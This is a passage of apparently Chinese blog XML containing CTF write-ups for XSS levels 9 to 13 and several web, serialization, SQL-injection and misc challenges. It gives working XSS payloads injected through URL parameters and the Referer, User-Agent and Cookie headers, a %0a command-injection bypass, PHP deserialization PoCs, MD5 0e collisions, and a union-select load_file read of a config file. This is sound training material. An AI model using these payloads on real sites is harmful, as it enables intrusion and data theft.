第九关：页面看起来和第八关一样，但是测试发现在框里无论输入什么js代码，都是被链接到”您的链接不合法，有没有”，顿时没了思路，问了下大佬，还是利用伪协议：1javascript:alert(&apos;http://&apos;) 但是发现JavaScript关键字被替换了，于是用Unicode编码绕过：1javascri pt:alert(&apos;http://&apos;)。 或者：1javascri pt:alert(1)//http://www.0aa.me 猜测是对链接进行了检测，如果检测不到http://就认为是个假链接，就不会输出到a标签的value中 第十关：没有输入框，只能在url处做文章，简单测试发现没有反应，并且尖括号被过滤。查看源码发现有三个隐藏表单属性，因此猜测url处构造参数可以实现xss。经过测试发现只有t_sort能接受参数：1keyword=1&amp;t_sort=1 源码：1&lt;input name=&quot;t_sort&quot; value=&quot;1&quot; type=&quot;hidden&quot;&gt; 思路：在标签里构造事件：1keyword=1&amp;t_sort=&quot; type=&quot;text&quot;onmouseover=&quot;alert(123) 成功弹框（type=”text”是必须要添加的，否则onmouseover事件不能使用，也就不能弹框）。此时查看源码：1&lt;input name=&quot;t_sort&quot; value=&quot;&quot; type=&quot;text&quot;onmouseover=&quot;alert(123)&quot; type=&quot;hidden&quot;&gt; 第十一关：查看源码发现和第十关类似，有四个隐藏表单。测试发现和第十关一样只有t_sort能接受参数：于是构造事件：1keyword=1&amp;t_sort=&quot; type=&quot;text&quot;onmouseover=&quot;alert(123) 我就知道没这么简单，怎么可能和上一道题一样嘛，直接在url处构造怕是不能绕过前端限制了，等等我为什么要说绕过前端，绕过前端限制当然是抓包改包了哈哈哈哈。但是抓包后还是不能绕过，shit！求助万能的谷歌，上面说抓包后的referer会显示在后面的value值里，难怪最后那个隐藏表单名字叫t_ref，于是构造Referer:1&quot; type=&quot;text&quot; onmouseover=&quot;alert(123)&quot; 可能是环境的原因，我抓到的包只有X-forward-for：127.0.0.1，并没有referer的包，所以只有手动添加了。 第十二关：查看源码发现value里面信息像是User-Agent的信息，抓包发现果然如此，有了第十一关的经验，于是将User-Agent信息修改为：1User-Agent:&quot; type=&quot;text&quot; onmouseover=&quot;alert(123)&quot; 成功弹框。 第十三关：查看源码发现有个隐藏表单叫’t_cook’，我赌一百块cookie的信息会输出在里面！抓包果然，老套路，将cookie修改为：1Cookie:&quot; type=&quot;text&quot; onmouseover=&quot;alert(123)&quot; 但是发现出错了，再仔细观察原来的cookie，发现是将Cookie:user=后面的内容输出在隐藏表单里，于是修改cookie为：1Cookie:user=&quot; type=&quot;text&quot; onmouseover=&quot;alert(123)&quot; 成功弹框。我猜下一道题说不定是将accept的信息输出在隐藏表单里。 第十四关以后的感觉是xss进阶了，再去学习一下再来更]]></content>
      <tags>
        <tag>Write Up</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[道格平台部分WP]]></title>
    <url>%2F2017%2F09%2F26%2FDog3_wp%2F</url>
    <content type="text"><![CDATA[Webxxxxxxxx：直接插：1&lt;script&gt;alert(123)&lt;/script&gt; 查看源码,于是构造：1”&gt;&lt;script&gt;alert(123)&lt;/script&gt; 成功弹窗 xxxxxxxxxx:直接插：1&lt;script&gt;alert(123)&lt;/script&gt; 查看源码： 看来script关键字被过滤了，最喜欢这种直接转义成空的过滤 于是双写绕过：1”&gt;&lt;scrscriptipt&gt;alert(123)&lt;/scrscriptipt&gt; 成功弹窗 exec1：题目提示swp，于是想到源码泄露，用御剑扫出了.swpm。然后访问得到index.php.swp文件，用winhex打开，在下面有源码。整理后发现?&gt;在上面，&lt;?php在下面，于是推测是反过来了的，最后整理得到源码。源码看着很眼熟，想起是dvwa里的命令注入源码，于是构造:1?ip=127.0.0.1|net user 结果不行，仔细看和dvwa很像，但是这道题把管道符给过滤了.后来在网上看到可以用%0a绕过，于是构造1?ip=127.0.0.1%0als 得到flag.php和index.php两个文件，构造1?ip=127.0.0.1%0a index.php 发现和之前得到的swp文件是一致的，再访问flag.php发现什么都没有窝草，纠结了很久，点了下查看源码…. Burp：直接将后三位加$$进行爆破，其实一开始思路都对了，也做出来了，结果把返回长度997填上去，怎么都不对，今天才发现，心态爆炸。 我们分手了：一看是序列化的题。构造poc：1234567891011&lt;?phpclass just4fun &#123; public $filename; function __toString() &#123; return @file_get_contents($this-&gt;filename); &#125;&#125;$i = new just4fun();$i-&gt;filename = ‘13579flag.php’;var_dump(serialize($i));?&gt; 得到的值为：1string(55) “O:8:”just4fun”:1:&#123;s:8:”filename”;s:13:”13579flag.php”;&#125;” 于是构造url：1audit_4.ph0rse.me/?data=O:8:”just4fun”:1:&#123;s:8:”filename”;s:13:”13579flag.php”;&#125; 但是还是不对，再看一遍代码，撞正则枪口上了，谷歌一下，找了挺久一个博客上说可以用+来绕过：1audit_4.ph0rse.me/?data=O:+8:”just4fun”:1:&#123;s:8:”filename”;s:13:”13579flag.php”;&#125; 为什么还是不对！然后问了下大佬，+号url编码就过了，做题还是不够细致 SYB1：根据提示构造SYB.php.bak得到备份文件。源码主要是说key关键字会被转义成空，最喜欢转义成空的了1md5($key1) == md5($key2) &amp;&amp; $key1 !== $key2 这段代码自然要拿出我珍藏的两个0e漏洞的值了：s878926199a和s155964671a，构造url：1http://118.89.167.246:2501/SYB.php?kkeyey1=s878926199a&amp;kekeyy2=s155964671a sql：点开链接就是源码，简单分析下：先get一个id参数，好吧感觉没啥好说的，或者不知道怎么说。默认是debug=1，肯定要改成?id=1,回显hello admin，玛德我都是admin了还不给我flag？开玩笑开玩笑。再试试id=2，返回一个字符串，是ip，还有句nothing here。估计这是死路。构造1?id=1 and 1=1 返回正常。再构造1=2，返回错误，说明此处存在sql注入。构造1?id=1 and 1=1 order by 1–+ 测试字段数，测试结果表明只有一个字段。构造1?id=1 and 1=1 union select 1–+ 窝草没反应1？id=-1 and 1=1 union select 1–+ 有了有了，老套路，最后得flag。窝草！我就知道没这么简单！出题人在哪！顿时没了思路，询问了下大佬，大佬只回复我：你看第一个查询和第二个查询之间多了点东西，总不会白多吧。于是想到可以加个if条件判断，尝试了几次，最后发现用127.0.0.1的ip不行，要将ip改掉（任意），正确payload：1http://118.89.167.246:4001/?id=if((select%20ip%20from%20logs%20where%20ip=%27127.0.0.2%27%20limit%201),1,2)–+ 同时在抓的包里要将x-forwarded-for改为：127.0.0.2。（补充，昨晚做出来以后，今天发现同样的做法不能注出flag了，试了几次发现，每次payload的ip不能是以前注入时用过的，否则不能注入成功） 附上大佬的payload，直接读取文件：1?id=1 and 1=2 union select load_file(‘/var/www/html/config.php’)# 一个有故事的人：反序列化，只要满足1$o-&gt;secret === $o-&gt;enter 就能得到flag，一开始构造poc：123456789&lt;?phpclass just4fun &#123;var $enter;var $secret;&#125;$i = new just4fun();$i-&gt;enter = $i-&gt;secret;var_dump(serialize($i));?&gt; 但是不对，试了几次都不行，再想到题目提示有取地址符，那么secret和enter就能指向同一个变量，也能满足if条件，于是改为：1&amp;$j-&gt;enter = $j-&gt;secret; 报错，笑死我了，去地址符怎么可能这样用，最终版：123456789&lt;?phpclass just4fun &#123;var $enter;var $secret;&#125;$i = new just4fun();$i-&gt;enter = &amp;$i-&gt;secret;var_dump(serialize($i));?&gt; 结合上一道序列化的题以及以前遇到过的题，感觉两者各自构造的poc的方式都是类似的，像是模板一样，也可能是我现阶段做的题还太简单 暴走XSS：1http://eagerseven.cn/2017/09/26/Baozou_XSS/ MISC:misc_1：直接改后缀为zip，打开得flag hooooop：看了好久好久，又去搜了下常规加密方式，感觉和猪圈密码最像。也试了很多次，因为A和J，H和Q有异议，所以得试很多次，而且最坑爹的是小写！得到正确flag misc_2：txt文件里提示了明文攻击，于是扔到ARCHPR里，将txt文件压缩，再把压缩的txt和加密文件拖进去就行了 The emoji system：]]></content>
      <tags>
        <tag>Write Up</tag>
      </tags>
  </entry>
</search>
